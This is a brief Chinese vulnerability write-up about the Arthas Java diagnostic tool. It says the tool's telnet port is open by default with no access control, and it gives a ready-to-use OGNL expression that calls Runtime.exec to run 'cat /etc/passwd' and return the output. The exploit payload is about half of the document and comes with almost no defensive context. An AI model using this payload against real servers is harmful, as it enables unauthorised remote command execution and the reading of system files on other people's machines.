### 一 漏洞描述
arthas是阿里巴巴开源的Java诊断工具，基本使用场景是定位复现一些生产环境比较难以定位问题。可以在线排查问题，以及动态追踪Java代码，实时监控JVM状态等等。

Arthas默认开启telnet，且无访问控制措施。攻击者可以通过连接telnet端口并构造恶意ognl表达式，获取服务器命令执行权限。

### 二 漏洞利用
```
ognl "#r=@java.lang.Runtime@getRuntime(),#cmd='cat /etc/passwd',#p=#r.exec(#cmd),#ips=#p.getInputStream(),#isr=new java.io.InputStreamReader(#ips),#br=new java.io.BufferedReader(#isr),#result=#br.lines().parallel().collect(@java.util.stream.Collectors@joining(@java.lang.System@lineSeparator()))"
```
